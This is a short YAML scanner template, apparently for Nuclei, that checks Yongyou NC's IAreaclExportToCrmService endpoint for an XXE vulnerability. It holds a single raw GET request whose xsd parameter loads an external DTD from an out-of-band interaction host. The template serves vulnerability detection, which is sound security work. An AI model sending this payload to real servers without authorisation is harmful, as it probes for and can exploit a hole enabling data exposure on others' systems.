id: poc-yaml-yongyou-nc-iareaclexporttocrmservice-xxe
info:
  name: Yongyou NC IAreaclExportToCrmService XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: dnslog, xxe
http:
  - raw:
      - |
        GET /uapws/service/nc.itf.bd.crm.IAreaclExportToCrmService?xsd=http://{{interactsh-url}}/ext.dtd HTTP/1.1
